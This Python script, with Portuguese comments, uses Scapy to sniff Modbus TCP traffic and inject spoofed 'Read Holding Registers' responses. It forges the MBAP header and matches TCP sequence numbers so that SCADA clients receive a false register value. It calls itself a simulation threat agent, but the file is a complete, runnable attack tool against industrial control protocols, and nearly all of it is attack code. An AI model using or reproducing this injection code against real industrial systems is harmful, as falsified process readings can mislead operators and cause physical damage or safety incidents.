#!/usr/bin/env python3
import sys
from scapy.all import sniff, send, IP, TCP, Raw

# --- Configuração do Ataque ---
LISTEN_PORT = 502      # Porta padrão do Modbus TCP
FAKE_VALUE = 999       # Valor falsificado a ser injetado (0x03E7 em Hex)
FAKE_VALUE_BYTES = FAKE_VALUE.to_bytes(2, 'big')

def handle_modbus_request(packet):
    """
    Processa requisições Modbus em tempo real e injeta respostas falsas
    interceptando o alinhamento de sequência TCP (Hijacking).
    """
    # Verifica se o pacote possui as camadas básicas necessárias
    if not packet.haslayer(TCP) or not packet.haslayer(Raw):
        return

    payload = bytes(packet[Raw].load)
    
    # GARANTIA TÉCNICA: O Function Code do Modbus TCP fica estritamente no byte de índice 7
    if len(payload) > 7 and payload[7] == 0x03:
        print(f"\n[+] Requisição 'Read Holding Registers' interceptada de {packet[IP].src}:{packet[TCP].sport}")

        # --- Construção da Resposta Falsa (Spoofed MBAP + PDU) ---
        
        # 1. Preserva o Transaction ID original da requisição (Bytes 0 e 1)
        transaction_id = payload[0:2]
        protocol_id = b'\x00\x00'
        
        # 2. Define o Unit ID original (Byte 6) e Function Code (Byte 7)
        unit_id = payload[6:7]
        function_code = b'\x03'
        byte_count = b'\x02' # 1 registrador = 2 bytes de dados
        
        # 3. Monta o PDU e calcula o tamanho dinâmico do cabeçalho MBAP
        response_pdu = function_code + byte_count + FAKE_VALUE_BYTES
        length_field = len(response_pdu).to_bytes(2, 'big')
        
        # 4. Consolidação do payload malicioso completo
        full_response_payload = transaction_id + protocol_id + length_field + unit_id + response_pdu

        # --- Injeção do Pacote com Casamento de Sequência TCP ---
        ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)
        
        tcp_layer = TCP(
            sport=packet[TCP].dport, 
            dport=packet[TCP].sport, 
            flags="PA", 
            seq=packet[TCP].ack, 
            ack=packet[TCP].seq + len(payload)
        )
        
        spoofed_packet = ip_layer / tcp_layer / Raw(load=full_response_payload)
        
        # Envia a resposta falsa para o cliente SCADA
        send(spoofed_packet, verbose=0)
        print(f"[*] Resposta falsa (Injeção de valor: {FAKE_VALUE}) enviada com sucesso para {packet[IP].src}")

def main():
    """Inicializa o sniffer do módulo de ataque."""
    iface_name = "Ethernet"
    if len(sys.argv) > 1:
        iface_name = sys.argv[1]

    print("--- DMODBUS Simulation Threat Agent Iniciado ---")
    print(f"Monitorando interface: '{iface_name}' na porta {LISTEN_PORT}...")
    
    try:
        sniff(iface=iface_name, filter=f"tcp port {LISTEN_PORT}", prn=handle_modbus_request, store=0)
    except Exception as e:
        print(f"[ERRO] Falha ao iniciar ataque. Execute como Administrador/Sudo. Detalhes: {e}")

if __name__ == "__main__":
    main()